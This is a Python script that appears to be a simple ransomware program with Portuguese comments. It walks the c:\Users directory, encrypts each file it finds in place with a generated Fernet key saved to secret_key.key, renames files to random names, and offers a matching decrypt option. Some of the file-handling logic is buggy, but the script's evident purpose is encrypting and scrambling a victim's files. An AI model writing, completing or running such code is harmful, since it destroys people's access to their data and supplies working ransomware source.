import os
from cryptography.fernet import Fernet
from protected import RESTRICTED, name

# search all files
def search_files() -> (list|str):
    path = r"c:\Users"
    all_files = []
    # Alterando o diretório de trabalho
    os.chdir(path)

    # Percorrendo os arquivos no diretório
    for root, dirs, files in os.walk(path, topdown=True):
        for file in files:
            if file in RESTRICTED:
                continue
            all_files.append(file)
    return all_files
    # folder = os.getcwd()
    # files = []
    # for file in os.listdir(folder):
    #     if os.path.isfile(os.path.join(folder,file)):
    #         if file in RESTRICTED:
    #             continue
    #         files.append(file)
    # return files

# change name file
def changer(files) -> None:
    folder = os.getcwd()
    files = []
    for file in os.listdir(folder):
        if os.path.isfile(os.path.join(folder,file)):
                if file in RESTRICTED:
                    continue
                files.append(file)

    for file in files:
        if file in RESTRICTED:
            continue
        crypt = name()
        os.rename(file, crypt)

# encrypt and decrypt
def crypto(files) -> str:
    
    choice = input("crypto or decrypt (C | D): ")
    if choice.upper() == "C":
        
        # generate key and write
        key = Fernet.generate_key()
        with open("secret_key.key", "wb") as key_file:
            key_file.write(key)
        
        # encrypt
        cipher_suite = Fernet(key)
        for file in files:
            with open(file, "rb") as file_edit:
                read_bytes = file_edit.read()
                
            crypt_file = cipher_suite.encrypt(read_bytes)
                
            with open(file, "wb") as file_edit:
                file_edit.write(crypt_file)
        # changer name
        file_name = search_files()
        changer(file_name)
                
    # check if the key exists
    elif choice.upper() == "D":
        try:
            with open(RESTRICTED[1], "rb") as key_file:
                key = key_file.read()
        except FileNotFoundError:
            print("Error: Decryption key was not found.")
            return
        try:
            cipher_suite = Fernet(key)
        except ValueError:
            print("Error: the key file is empty")
            return
        
        # decrypt
        for file in files:
            with open(file, "rb") as file_edit:
                crypt_file = file_edit.read()
            try:
                decoded_bytes = cipher_suite.decrypt(crypt_file)
                with open(file, "wb") as file_edit:
                    file_edit.write(decoded_bytes)
                    file_edit.closed
                print(f"File {file} successfully decrypted!!")
            except Exception as e:
                print(f"Error while decrypting {file}")
    else:
        print("Invalid choice! Use 'C' to encrypt and 'D' to decrypt")
        
# main
def main() -> None:
    files = search_files()
    #changer(files)
    crypto(files)